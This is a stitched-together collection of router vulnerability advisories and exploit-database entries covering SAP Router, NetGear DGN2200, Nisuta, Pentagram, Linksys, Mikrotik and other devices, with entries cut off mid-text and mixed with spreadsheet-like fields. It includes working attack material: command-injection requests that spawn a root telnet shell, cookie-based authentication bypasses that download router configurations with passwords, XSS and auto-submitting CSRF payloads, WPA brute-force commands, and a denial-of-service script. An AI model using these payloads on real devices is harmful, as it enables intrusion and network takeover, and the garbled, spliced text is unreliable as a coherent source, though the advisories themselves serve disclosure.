1. Disable the use of passwords on the Route Permission Table [2].
2. Enforce the use of SNC (Secure Network Communications) as an
authentication mechanism for securing routes.
6. *Credits*
This vulnerability was discovered and researched by Martin Gallo
from Core
Security Consulting Services. The publication of this advisory was
coordinated by Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
SAP Router permits and/or forbids networks connections based on a
Route Permission Table [2]. Entries in the
Route Permission Table can have a password. If a password is
specified
for a given entry in the Route Permission Table, SAP Router checks
whether
the user-supplied password matches with the one in the Route
Permission
Table entry before permitting a connection.
The vulnerable function 'passwordCheck'
performs a non-constant time string comparison for checking the
user-supplied password against the on in the Route Permission Table.
On the first non-matched character, the string comparison function
immediately interrupts the evaluation cycle, which may let an
attacker perform timing attacks.
The following snippet shows an excerpt of the vulnerable code
within the
'passwordCheck' function:

Summary
BAE Systems Applied Intelligence researcher, Andrew Horton has identified that the NetGear N300 Wireless ADSL 2+ Modem Router model DGN2200 suffers from multiple vulnerabilities which may be exploited by both local and remote attackers. This enables an attacker to completely compromise the device and stage further attacks against the local network and internet.
NetGear have indicated that this product is beyond its end of life and therefore these vulnerabilities will not be patched. As a result, BAE Systems have delayed release of this advisory for over 12 months to reduce the likelihood of active exploitation.
1.UPNP Vulnerable to CSRF
Requires
Luring an unauthenticated or authenticated user to an attacker-controlled webpage.
Description
The Universal Plug and Play (UPNP) implementation used by NetGear accepts an HTTP POST request as a valid XML request, rendering the UPNP service vulnerable to inter-protocol Cross-Site Request Forgery attacks. This can be used to bypass or alter firewall rules.
The UPNP interface of the router listens on TCP port 5000 and can only be accessed from the LAN side of the device. UPNP requests do not require authentication with passwords. This vulnerability exists because the request is initiated by a user's browser on the LAN side of the device.
Impact
Using this vulnerability, BAE Systems was able to add new firewall rules to enable internet access to the insecure telnet port and the admin web interface.
Proof of concept
The following webpage will make telnet for the router accessible to the internet so that it may be attacked using the GearDog  backdoor (See issue 5). The GearDog backdoor is a known remote access backdoor implemented in many NetGear products. This requires brute-forcing the MAC address.

</html>
Note: 192.168.0.1 is the default LAN IP address. Port 23 is the internal port number and port 887 is the external port number to be opened.
Solution
Ensure that UPNP requests sent through HTTP POST parameters are not honoured.
2.Command Execution with Ping
Requires
Authenticated access to the web administration interface.
Description
The ping function available through the web interface is vulnerable to operating system command injection. An attacker with authenticated web user access can gain OS command execution privileges which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Impact
Using this vulnerability, BAE Systems was able to execute arbitrary commands on the underlying Linux operating system  as the root user.
Proof of concept
Example exploitation to obtain a file and directory listing:
POST /ping.cgi HTTP/1.1
Host: 192.168.0.1
Proxy-Connection: keep-alive
Content-Length: 81
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YXBwbGU3ODE=
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://192.168.0.1/DIAG_diag.htm
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
IPAddr1=a&IPAddr2=b&IPAddr3=c&IPAddr4=d&ping=xxxx&ping_IPAddr=|ls
To get an interactive shell,
1. Send the following POST data:
IPAddr1=a&IPAddr2=b&IPAddr3=c&IPAddr4=d&ping=xxxx&ping_IPAddr=|/usr/sbin/telnetd -p 90 -l /bin/sh
2. Telnet to port 90
Solution
Validate untrusted user input using a whitelist of acceptable values. For example, IPv4 address values may only include the digits '0' through '9', and full stops ('.')
3.Blind Command Execution with DNS Lookup
Requires
Authenticated access to the web administration interface.
Description
The DNS lookup function available through the web interface is vulnerable to operating system command injection. An attacker with authenticated web user access can gain OS command execution privileges which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Impact
Using this vulnerability, BAE Systems was able to execute arbitrary commands on the underlying Linux operating system but was unable to see the response.
Proof of concept
Example exploitation demonstrating the issue through use of the sleep command to delay the response from the server:
POST /dnslookup.cgi HTTP/1.1
Host: 192.168.0.1
Proxy-Connection: keep-alive
Content-Length: 32
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YXBwbGU3ODE=
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://192.168.0.1/DIAG_diag.htm
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
host_name=|sleep 5&lookup=Lookup
To get an interactive shell,
1.Send the following POST data:
hostname=|/usr/sbin/telnetd -p 90 -l /bin/sh&lookup=Lookup
2.Telnet to port 90
Solution
Validate untrusted user input using a whitelist of acceptable values. For example, hostname values may only contain uppercase or lowercase ASCII letters, the digits '0' through '9', full stops (.) and hyphens ('-').
4.No Cross-Site Request Forgery (CSRF) Protection
Requires
Luring a logged in admin user into following a malicious link
Description
An attacker can lure a user into following an untrusted link to a malicious webpage that will exploit the lack of CSRF protection by forcing the user's web browser to perform unwanted actions, such as altering firewall rules. This attack returns no information to the attacker, so it is effectively 'blind', however this does not detract from the threat.
The command execution vulnerabilities described above can be performed through CSRF.
Impact
Using this vulnerability, BAE Systems was able to update configuration of the device, including changing WPA keys, alter firewall rules and perform command execution through exploitation of the ping and DNS features.
Solution
Include an anti-CSRF token in all web forms and ensure that the token is present and correct when HTTP requests for actions are received.
5.Gearguy/Geardog Telnet Backdoor
Requires
Ability to telnet to port 23 (only on LAN side by default)
Description
There is a backdoor (feature) built into many NetGear devices, where a user can gain operating system command access without requiring a password. This issue has been previously reported in other NetGear devices.
NetGear provides a windows executable to do this. A Linux client is available from http://code.google.com/p/netgear-telnetenable/
Send a Blowfish encrypted message to port 23 from the LAN. When you reconnect, it provides a shell without a password required.
Impact
Using this vulnerability, BAE Systems was able to gain a root shell on the underlying Linux operating system without supplying any authentication credentials. This would allow complete device compromise, which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Proof of concept
python telnet-enabler.py 192.168.0.1 ""204E7F2172C8"" Gearguy Geardog
Sent telnet enable payload to '192.168.0.1:23'
Solution
Remove the backdoor feature from the device. If a last resort admin console or reset function is required, implement it to require interaction with the device so that only a person with physical access to the device is able to use this function.
6.FTP Insecure Root Directory
Requires
FTP to be enabled (not enabled by default)
Description
The FTP server allows a user to access configuration files and to traverse outside the folder that contains files intended to be shared by FTP.
It is possible to list and retrieve files in the / folder, however the user is restricted from using the cd or CWD command to change the current directory to '/'.
Impact
Using this vulnerability, BAE Systems was able to gain access to sensitive configuration files.

7.Cannot Disable WPS
Requires
Local proximity and WiFi enabled
Description
Wi-Fi Protected Setup (WPS) is an insecure protocol vulnerable to bruteforce attacks due to design vulnerabilities. The NetGear device does not provide an effective method to disable WPS. An attacker with local proximity to the device while WiFi is enabled, can bruteforce WPS, and obtain the WPA key which allows an attacker to connect to the WiFi access point, and decrypt WiFi traffic from other users.
Software such as Reaver, can be used to brute-force the WPS key, usually within about ten hours. Reaver is available from http://code.google.com/p/reaver-wps.
The 'Advanced Wireless Settings' page contains the following section:
WPS Settings
Router's PIN:99999999
[Tickbox] Disable Router's PIN
[Tickbox] Keep Existing Wireless Settings
Ticking the 'Disable Router's PIN' box appears to have no effect.
Impact
Using this vulnerability, BAE Systems was able to crack the wireless password, and gain access to the WPA2 PSK wireless network hosted by the device.
Proof of concept
This vulnerability can be exploited with the Reaver tool available from http://code.google.com/p/reaver-wps/.
Solution
Implement a method for users to easily and effectively disable WPS.
8.Passwords Stored in Plaintext
Requires
Telnet access or exploitation of a vulnerability providing command execution
Description
The router stores passwords in the /etc/passwd file in plaintext instead of using encrypted hashes.
Impact
Using this vulnerability, BAE Systems was able to learn the passwords used to access the device.
Proof of concept
nobody:*:0:0:nobody:/:/bin/sh
admin:s3cr3tp4ssw0rd:0:0:admin:/:/bin/sh
guest:guest:0:0:guest:/:/bin/sh
Solution
Store user passwords as a non-reversible cryptographic hash, such as SHA-256.
9.Pre-Authentication Information Disclosure
Requires
Unauthenticated access to the web interface
Description
This issue has been previously reported in other NetGear devices and is the same issue reported here:
* http://websec.mx/advisories/view/Revelacion_de_informacion_en_Netgear
Impact
Using this vulnerability, BAE Systems was able to learn some identifying features of the device without needing to provide credentials.
Proof of concept
URL: http://192.168.0.1/currentsetting.htm
Firmware=V1.0.0.36_7.0.36
RegionTag=DGN2200_WW
Region=ww
Model=DGN2200
InternetConnectionStatus=Up
ParentalControlSupported=1
Solution
Restrict access to webpages containing sensitive functionality or data to authenticated users.
10.Firmware Update Vulnerable to Man In The Middle
Requires
Control of the users network, for example at the ISP level or local network.
Description
Each time an admin logs into the web interface, the web interface attempts to find new firmware on an FTP server.
FTP is an insecure protocol that is vulnerable to man-in-the-middle attacks. An attacker could provide a backdoored version of the firmware.
Updates are sourced from: ftp://14.0.34.208/dgn2200/ww/
Impact
Using this vulnerability, BAE Systems was able to provide a malicious firmware image to the router.
Solution
Retrieve updates using a protocol with SSL/TLS with certificate validation.
Apply a public key signature to firmware images and check them before usage.
End User Recommendation
Replace your NetGear router with a more recent model that can receive updated firmware.

1.Vulnerability Information
Impact: Remote attackers can bypass authentication and access the router's management web interface obtaining complete control of the device
Remotely Exploitable: Yes
Bugtraid Id: <unknown>
CVE: <unknown>
2.Vulnerability Description
The Nisuta (www.nisuta.com) NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password.
A remote attacker can bypass authentication and gain access to the remote management web interface, taking control of the device, without knowing the password.
3.Vulnerable Systems
Nisuta NS-WIR150NE wireless router, firmware v5.07.41
Nisuta NS-WIR300N wireless router, firmware v5.07.36_NIS01 (hardware version v3.0)
and probably other Nisuta wireless routers with similar firmware.
4.Vendor Information, Solutions and Workarounds
The vendor made available the following firmware updates:
Nisuta NS-WIR150NE
Nisuta NS-WIR150NF
Nisuta NS-WIR300N
No firmware update is available. The router remains vulnerable.
The fix implemented by the vendor is not optimal, although better than any workaround.
As a workaround, disable remote management on the WAN interface (not enabled by default).  However, it is not possible to disable remote management on the LAN interface, and
applying the fix is recommended.
It is possible to restrict remote management on the WAN interface based on source IP address, but given the critical nature of this vulnerability we do not recommend it as a workaround.
It is also worth mentioning that the remote management web interface works over http without encryption, even with the flaw described in this advisory fixed, the interface is still insecure for other reasons.
5.Credits
This vulnerability was discovered by Amplia Security Research.
We thank Nisuta for their efforts to try to fix this vulnerability and improve the security of their products.
6. Technical Description
The Nisuta NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default).
This remote management web interface requires a password and uses form-based authentication (performed over http without encryption, which is another issue).
After entering the correct password, the router's remote management web interface always sets the same cookie, shown next:
Set-Cookie: admin:language=en; path=/
This cookie is hard-coded and obviously insecure.
Using this cookie in a HTTP request is enough to ""bypass authentication"" and login to the remote management web interface as an administrator without knowing the password.
The 'admin' value is not even required.  For example,
Cookie: :language=en; path=/
is enough to gain access to the router.
PoC Exploit:
An unauthenticated remote attacker on the WAN and LAN interfaces can perform any action available on the router's remote management web interface, as an example, the following command will bypass authentication and download the router's configuration which includes the current remote management web interface password among other confidential information:
$ wget --header=""Cookie: :language=en"" http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg -t 1
The password is in the 'http_passwd' variable:
$ grep http_passwd config.cfg
http_passwd=mysecretpassword
The attacker can now conveniently login into the remote management web interface with full control and perform changes, obtain information, etc.
Again, the password is not needed, the attacker can just set the cookie 'admin:language=en' in his browser to gain access to the management interface or  perform other actions directly, this is just an example.
Custom implementation of the PoC exploit:
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
public class poc {
public static void main(String[] args)
try {
URL url = new URL(""http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg"");
URLConnection conn = url.openConnection();
conn.setRequestProperty(""Cookie"", "":language=en"");
BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
String line;
while ((line = rd.readLine()) != null) {
System.out.println(line);
} catch(Exception e) {
e.printStackTrace();

# Author: Matt O'Connor / Planit Computing
# Advisory Link:  http://www.planitcomputing.ie/upc-wifi-attack.pdf
# Version:
# Category: Remote
# Tested on: Cisco EPC 2425 / Horizon Box","The Cisco EPC 2425 routers supplied by UPC are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
Random
A to Z Uppercase only
8 characters long
208,827,064,576 possible combinations ( AAAAAAAA  ZZZZZZZZ ) 26^8
We notified UPC about the problem in November 2011 yet UPC are still supplying customers with newer modems / horizon boxes that use this algorithm.
At the time, graphics cards were expensive and clustering several machines was not financially viable to the average hacker.
We recently purchased a used rig, comprising off:
Windows 7
I3 Processor
4GB RAM
2TB Drive
Radeon HD 5850
We generated 26 dictionary files using mask processor by ATOM, piping each letter out to its own file, for example:
A:  ./mp32 A?u?u?u?u?u?u?u > A.TXT = AAAAAAAA  AZZZZZZZ
B: ./mp32 B?u?u?u?u?u?u?u > B.TXT = BAAAAAAA  BZZZZZZZ
etc
Each .txt file weighed in at around 60GBs each.  The 26 files took up about 1.6TB of storage.
We now had the complete key space, partitioned into 26 different files.  This allowed us to distribute the brute force attack amongst multiple computers.  There are other ways with ocl-hashcat but this was the simplest.
Using our Radeon HD5850 on standard settings, we were hitting 80,000 keys per second.  Breakdown below:
26^8 = 208,827,064,576 ( 208 billion possible combinations )
26^8 / 80,000 keys per second = 2,610,338 seconds
2,610,338 / 60 seconds = 43,505 minutes
43,505 / 60 minutes = 725 hours
725 hours / 24 hours = 30 Days
For 185, we had built a computer that could crack the default UPC wireless password within 30 days.  The WPA-PSK handshake we used started with the letter D and was cracked within 96 hours.
We ended up getting a second machine for the same price which resulted in our maximum cracking time being reduced to 15 days.
If youre using the default password on your UPC broadband connection, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols."
2013-12-12,WebApps,Hardware,condis,Pentagram Cerberus P 6363 DSL Router,Multiple Vulnerabilities,#Please don't change this file by hand,"PENTAGRAM Cerberus P 6363 DSL Router Multiple Vulnerabilities
Found by condis
Vendor Site / Model: http://www.pentagram.pl/produkty/cerberus-p-6363
Firmware version: V5.07.28_PEN01
Software version: V3.0
1. Prolog
Cerberus P 6363 is simple SOHO class router. Its producer claims that it may act
as a 4 port switch and has an advanced firewall (...)
Device management is only possible through WWW GUI and because of that, GUI was
targeted and is subject of this raport.
2. Authentication Bypass (CWE-592)
This bug is really trivial. All we need to do is set up ""special"" cookie before
accessing GUI:
condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg

3. Multiple Cross Site Scripting (CWE-79)
GUI has some simple function that filters out non-alphanumeric characters but it
is written in JavaScript, and as we all know, implementing protection only on
client-side is no protection at all.
One of attack methods would be to turn off JavaScript or write some simple scripts
(i.e.: using curl, wget, etc) that won't interpret JS code like web browser does.
Second method (which is preferred by me) is to make configuration backup; modify
it manually changing relevant variables/directives and then reupload it back to
the device.
3.1 Setting WI-FI Password
wl_wpa_psk=wifi_password"";alert('XSS');//
This code will be executed on index page.
3.2 Setting URL Filtration
filter_url0=192.168.1.12-192.168.1.13:bar,0-6,0-0,on,foo"");alert('XSS');//
If ""filter_url_mode"" is disabled, we must change it to ""deny"" or ""pass"". Code
injected here will be executed in Security Settings -> URL Filter Setting page.
3.3 Setting MAC Address Filtration

If ""filter_mac_mode"" variable is disabled, we must change it to ""deny"" or ""pass"".

Probably there are more XSS flaws, but I stopped searching after those three...

any operation on the logged administrator. Below there is simple proof of concept

5. Epilogue
I tried to estalish a dialogue with vendor (07.12.2013) but they didn't respond
for five days (probably they don't give a fuck about security) so I decided to
publish all bugs.
Also, what's obvious there is no patch so best solution that I can think of now
is to stop using P 6363 and try other version. (P 6362 has different firmware
and at first glance it looked better)."

The WB-3300NR Unicorn Router suffers from numerous CSRF vulnerabilities.
Considering that by default the administrative pages do not require authentication, countless exploits exist.
*Proof of Concept*
1) Factory Reset

3) WPA Password Disclosure (possibility)(not proven)
The following PoC code only demostrates that with CSRF and XSS, it might be possible to obtain the WPA password.
However, I have been unable to do so without forcing the router to revert to factory defaults.

Technical Details
Tenda Wireless Router W309R doesn't have proper authentication for the web
application console. Though the application
asks for password, it has poor cookie management which allows a user to
login even without providing the password.
Application uses cookie value ""admin"" to access the private pages which
reveals configuration details such as
PPoE username, PPoE password, wireless authentication key, details of MAC
addresses etc, in the source code.

Hitron Technologies CDE-30364 is a famous ONO Router using, also, a web
management interface in order to set and change device parameters.
The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port
80) is prone to CSRF vulnerabilities which allows to change router
parameters and to perform many modifications to the router's parameters.
The default ip adress of this adsl router, used for management purpose, is
192.168.1.1.

| Details |
The exploit works in 3 stages.
1. Authentication.
2. Setting up shellcode in the memory at a known location.
3. Triggering an RA register over-write to execute the shellcode.
This particular model of router is based on 'embedded Configurable operating system' a.k.a (eCos) version 2.0. The shellcode used in the exploit is a dummy one that basically just triggers an exception & crashes the router, forcing it to reboot.

var pass="""";
Details:
By sending a specially crafted command to the affected routers, the clear text password for the admin account can be extracted, with no authentication required to access the page where it is stored.
During the initial setup of these four routers with the affected firmware, the admin password is stored in clear text on the main_internet.php? source code page as the value for 'var pass'. For this bug to exploitable from a remote network attack, UPnP and remote administrative access (port 8080 is set by default) must be enabled.
The vendor has not responded to any inquiries concerning the bug.

Additional Notes/Fixes/Workarounds:
Firmware notes: N900 and N900C with firmware 1.07.16 released on 05/2013 fixes the bug. It is advised that users with the N900 or N900C upgrade to 1.07.16.  Earlier firmware releases of 1.02.02, 1.03.11 and 1.04.08 are unaffected.
N600 and N750 with the earlier firmware 1.01.04 and 1.01.20 are unaffected by this bug. Firmware 1.02.08 was not tested. The 'workaround' for these two model routers, which will only stop network side attacks, is for the end user to disable remote administrative access capabilities.

# Affected version:
# - Firmware version: 3.16.4 Build 130205 Rel.63875n (Released: 2/5/2013)
# - Hardware version: WR740N v4 00000000 (v4.23)
# - Model No. TL-WR740N / TL-WR740ND
# Summary: The TL-WR740N is a combined wired/wireless network connection
# device integrated with internet-sharing router and 4-port switch. The
# wireless N Router is 802.11b&g compatible based on 802.11n technology
# and gives you 802.11n performance up to 150Mbps at an even more affordable
# price. Bordering on 11n and surpassing 11g speed enables high bandwidth
# consuming applications like video streaming to be more fluid.
# Desc: The TP-Link WR740N Wireless N Router network device is exposed to a
# remote denial of service vulnerability when processing a HTTP request. This
# issue occurs when the web server (httpd) fails to handle a HTTP GET request
# over a given default TCP port 80. Sending a sequence of three dots (...) to
# the router will crash its httpd service denying the legitimate users access
# to the admin control panel management interface. To bring back the http srv
# and the admin UI, a user must physically reboot the router.

# Action : Make a ZyXEL 642R Prestige Router inaccessible on port 23
// Variables
// Do the stuff...","ZyXEL 642R routers have difficulties handling certain types of malformed packets. In particular, it is possible to deny services by sending a vulnerable router a SYN-ACK packet. To a lesser degree, the router also encounters difficulties when handling SYN-FIN packets. In both instances, some services provided by the router (telnet, FTP and DHCP) will be denied, however, the device will continue to route network traffic. This issue has also been reproduced with other types of malformed packets.
ZyXEL 642R-11 and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that other ZyNOS-based routers are also affected by this vulnerability. ZxXEL 643 ADSL routers do not appear to be prone to this issue.
This issue may be exploited in combination with the vulnerability described in Bugtraq ID 3346.

Under some circumstances, a vulnerable Telindus router may leak sensitive information. When an attempt to connect to the router is made using the administrative software, the router sends the password to the client in plain text. This packet is sent via UDP.
**The vendor has released firmware version 6.0.27, dated July 2002. Reports suggest that this firmware does not adequately protect against this vulnerability. The firmware is reported to use an encrypted UDP packet when connecting to the router. However, the firmware uses a weak encryption scheme and thus it is easily circumvented by an attacker.

When a Zyxel router receives fragmented packets that after reassembly is greater than 64 kilobytes in length, the router crashes. The router must be power cycled to resume normal operation. This could lead to a remote user denying service to a legitimate user of the router. The router is affected only by fragmented packets received through the DSL interface. Fragmented packets sent through the LAN interface have no affect on the system.

Alpha Networks ADSL2/2+ Wireless Router ASL-26555 Remote Administration Password Disclosure
- Author:
Alberto Ortega @a0rtega
alberto[@]pentbox[.]net
- Version:
Tested on firmware version v2.0.0.30B_ES.
Laboratory subject: http://a0rtega.pentbox.net/files/asl-26555-zombie.jpg
- Summary:
Alpha Networks ADSL Wireless Routers have an administration web panel
to manage the device configuration.
To access the panel, the administrator has to visit the IP of the device using
the port 8000 with a web browser. It will prompt for authentication.
$ curl http://192.168.1.1:8000/SETUP/sp_home.htm
<title>401 Not Authorized</title>
<h1>401 Not Authorized</h1>
$ curl -I http://192.168.1.1:8000/SETUP/sp_home.htm
HTTP/1.1 401 Not Authorized
Server: LocalAccess
Date: Thu, 16 Aug 2012 18:23:08 GMT
WWW-Authenticate: Basic realm=""ASL-26555""
- The vulnerability:
If we investigate the directory /APIS/ in the same web server we will have a fully usable
API to grab information from the device.
This API doesn't seem to be documented anywhere, quite weird (backdoor?).
Also, this API doesn't require authentication and grant us administrator access.
The implemented calls to the API are:
returnWifiJSON.htm              returnInterfacesJSON.txt
returnWelcomeInfoJSON.htm       returnFirewallLevelJSON.txt
returnUsbJSON.htm               returnFirewallJSON.txt
returnServicesJSON.txt          returnDhcpList.htm
returnPasswordJSON.htm          returnDevicesJSON.htm
returnLoginStatusJSON.htm       returnApplicationsListJSON.htm
returnLoginJSON.txt             returnApplicationsJSON.htm
returnJSON.htm                  returnApplicationJSON.txt
returnIpJSON.txt                returnInternetJSON.htm
We can read all the configuration from the device without authentication. In addition, we have
a call named returnJSON.htm that returns us the credentials of the administrator user:
$ curl -I http://192.168.1.1:8000/APIS/returnJSON.htm
HTTP/1.1 200 OK
Server: LocalAccess
Date: Thu, 16 Aug 2012 18:29:50 GMT
Transfer-Encoding: chunked
Content-Type: text/html
$ curl http://192.168.1.1:8000/APIS/returnJSON.htm
""RETURN"":{
""success"": true,
""errorDescription"": ""ERROR_GENERAL""
""USER"":{
""USERNAME"": ""admin"",
""PASSWORD"": ""adm1n_passw0rd_exposed""
This credentials can be used to log into the web panel with the administrator account.
- Mitigation:
The only possible mitigation is to drop access to everyone from the outside
with a network level blocking configuration.
This can be done in the Advanced configuration of the device.
You can also turn off the web panel, but you won't be able to manage the device."

* Sends a specially constructed UDP packet on the discard port (9)
* which cause Ascend routers to reboot.  (Warning! Ascend routers will
* process these if they are broadcast packets.)
* Compiled under RedHat 5.0 with glibc.
* NOTE: This program is NOT to be used for malicous purposes.  This is
*       intenteded for educational purposes only.  By using this program
*       you agree to use this for lawfull purposes ONLY.
* It is worth mentioning that Ascend has known about this bug for quite
* some time.
* Fix:
* Filter inbound UDP on port 9.

# Exploit Title: Mikrotik Router Remote Denial Of Service attack
# Date: 19/4/2012
# Author: PoURaN @ 133tsec.com
# Software Link: http://www.mikrotik.com
# Version: All mikrotik routers with winbox service enabled are affected (still a 0day 30/5/2012)
# Tested on: Mikrotis RouterOS 2.9.6 up to 5.15
#  Vulnerability Description
# ===========================
# DETAILS & PoC VIDEO : http://www.133tsec.com/2012/04/30/0day-ddos-mikrotik-server-side-ddos-attack/
# The denial of service, happens on mikrotik router's winbox service when
# the attacker is requesting continuesly a part of a .dll/plugin file, so the service
# becomes unstable causing every remote clients (with winbox) to disconnect
# and denies to accept any further connections. That happens for about 5 minutes. After
# the 5 minutes, winbox is stable again, being able to accept new connections.
# If you send the malicious packet in a loop (requesting  part of a file right after
# the service becoming available again) then you result in a 100% denial of winbox service.
# While the winbox service is unstable and in a denial to serve state, it raises router's CPU 100%
# and other actions. The ""other actions"" depends on the router version and on the hardware.
# For example on Mikrotik Router v3.30 there was a LAN corruption, BGP fail, whole router failure
# => Mikrotik Router v2.9.6 there was a BGP failure
#=> Mikrotik Router v4.13 unstable wifi links
#=> Mikrotik Router v5.14/5.15 rarely stacking
#=>>> Behaviour may vary most times, but ALL will have CPU 100% . Most routers loose BGP after long time attack <<<=
#  The exploit
# =============
# This is a vulnerability in winbox service, exploiting the fact that winbox lets you download files/plugins
# that winbox client needs to control the server, and generally lets you gain basic infos about the service BEFORE
# user login!
# Sending requests specially crafted for the winbox service, can cause a 100% denial of winbox service (router side).
# This script, offers you the possibility to download any of the dlls that can be downloaded from the router one-by-one
# or alltogether! (look usage for more info) .. The file must be contained in the router's dll index.
# The dlls downloaded, are in the format of the winbox service.. Meaning that they are compressed with gzip and they
# have 0xFFFF bytes every 0x101 bytes (the format that winbox client is expecting the files)
# These DLLs can be used by the ""Winbox remote code execution"" exploit script ;)
#  Usage
# =======
# Use the script as described below:
# 1. You can download ALL the files of the router's dll index using the following command:
#python mkDl.py 10.0.0.1 * 1
#the ""1"" in the end, is the speed.. ""Speed"" is a factor I added, so the script delays a bit while receiving
#information from the server. It is a MUST for remote routers when they are in long distance (many hops) to use
#a slower speed ( 9 for example ).
#Also in the beginning of the dlls file list, script shows you the router's version (provided by router's index)
# 2. You can download a specific .dll file from the remote router.
#python mkDl.py 10.67.162.1 roteros.dll 1
#In this example i download roteros.dll (which is the biggest and main plugin) with a speed factor of 1 (very fast)
#Because roteros and 1-2 other files are big, you have to request them in different part (parts of 64k each)
#That is a restriction of winbox communication protocol.
#If you don't know which file to request, make a ""*"" request first (1st usage example), see the dlls list, and press ctrl-c
#to stop the script.
# 3. You can cause a Denial Of Service to the remote router.. Means denial in winbox service or more (read above for more)
#python mkDl.py 10.67.162.1 DoS
#This command starts requesting from router's winbox service the 1st part of roteros.dll looping the request
#and causing DoS to the router. The script is requesting the file till the router stops responding to the port (8291)
#Then it waits till the service is up again (using some exception handling), then it requests again till the remote
#service is down again etc etc... The requests lasts for about 2 seconds, and the router is not responding for about
#5 minutes as far as i have seen from my tests in different routeros versions.

3)Exploit
1)Introduction
D-Link DSL-2640B is an ADSL Router using (also) a web management interface.
2)Vulnerability Description
This router allows an attacker to bypass authentication and to login with administrator (""admin"") credentials.
In fact when the administrator is logged in and an internal attacker will connect to web management interface (default is http://192.168.1.1:80)
he will be able to see the MAC Address of logged admin. Symply changing his MAC Address the attacker can bypass authentication and login as
administrator.
3)Exploit
For example in OSX Snow Leopard you can on the fly change your MAC Address with the simple following CLI command:
ifconfig en0 ether <admin_mac_address>   (where en0 is the name of your network interface)"

# Exploit written by Ali Elouafiq , Exploit-DB , 2011","Sagem Fast Routers (3304-V1 / 3304-V2 / 3464 / 3504) Come with a default Preconfigured Root Password
That the ISPs don't change it, but instead they create another admin account above it,
the root password differs from a router to another, since it is computed from its MAC address.
Thus, each unique router has its own password what makes bruteforce or dictionary attacks inefficient or impossible
After reverse engineering the Algorithm that computes the default password based on the MAC address
This exploit opens a remote shell in the remote host.
(Generally its an Almquist Shell 'ash', which commands are compatible to the Bourne Shell 'bsh')
Usage: ./{file_name} ip_adress mac_address

2010-12-04,WebApps,Hardware,Martin Barbella,Linksys Routers,Cross-Site Request Forgery,,"It seems to be fairly well known that there are multiple unpatched
CSRF vulnerabilities in the administration interfaces for various
Linksys routers. Since the initial reports of these are from a few
years ago, and since some exploits are available, I have written
additional proof of concept exploits for the Linksys routers that I
have access to.
While in most cases the victim must be authenticated with the
application in question to exploit a CSRF vulnerability, since the
factory default passwords for all of the routers in question are known
to be admin, the victim does not necessarily need to be authenticated.
This means that only suggested workaround that I have seen up until
now, do not surf the web wile authenticated in the router's
administration interface, does not solve the problem in certain cases
where the user is still using the default password. This is mitigated
somewhat by the fact that most browsers provide at least some degree
of protection from these types of attacks, described in additional
detail below.
In each case, the proof of concept will enable remote administration
of the router on port 31337, while changing the password to __pwn3d__.
WRT54G2 PoC (tested with hardware version 1.5 and firmware version 1.50):
<html>
<head>
<title>WRT54G2 CSRF PoC</title>
</head>
<body onload=""document.getElementById('F').submit()"">
<form action=""http://192.168.1.1/Manage.tri""; method=""post"" id=""F"">
<input type=""hidden"" name=""MANAGE_USE_HTTP"" value=""0"" />
<input type=""hidden"" name=""MANAGE_HTTP"" value=""1"" />
<input type=""hidden"" name=""MANAGE_HTTP_S"" value=""0"" />
<input type=""hidden"" name=""MANAGE_PASSWORDMOD"" value=""1"" />

<input type=""hidden"" name=""MANAGE_UPNP"" value=""1"" />
<input type=""hidden"" name=""layout"" value=""en"" />
</form>
</body>
</html>
The form's action can be changed in the following way to attempt to
log in with the default password:
<form action=""http://a:admin () 192 168 1 1/Manage.tri"" method=""post"" id=""F"">
As I mentioned before, success of this type of exploit depends on the
victim's browser. This is simply blocked in IE8, while Safari will
give a phishing warning, Firefox warns the user that they are
attempting to log in with the name ""a"", and Google Chrome simply
allows the request without notifying the user in any way.
WRT54G PoC (tested with hardware version 6 and firmware version 1.02.8):
<html>
<head>
<title>WRT54G CSRF PoC</title>

<body onload=""document.getElementById('F').submit()"">
<form action=""http://192.168.1.1/manage.tri""; method=""post"" id=""F"">

<input type=""hidden"" name=""upnp_enable"" value=""1"" />
<input type=""hidden"" name=""layout"" value=""en"" />
</form>
</body>
</html>
To attempt a login with the default password, the same type of
modification can be made, as shown here:
<form action=""http://a:admin () 192 168 1 1/manage.tri"" method=""post"" id=""F"">
BEFSR41 PoC (tested with hardware version 3 and firmware version 1.06.01):
<img
